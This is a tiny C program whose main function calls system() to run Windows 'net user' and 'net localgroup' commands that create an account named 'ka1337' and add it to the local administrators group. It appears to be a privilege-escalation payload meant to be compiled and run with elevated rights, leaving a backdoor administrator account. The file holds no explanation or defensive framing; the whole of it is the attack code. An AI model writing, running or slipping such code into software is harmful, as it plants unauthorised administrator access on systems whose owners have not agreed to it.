#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user ka1337 <password> /add && net localgroup administrators ka1337 /add");
  return 0;
}
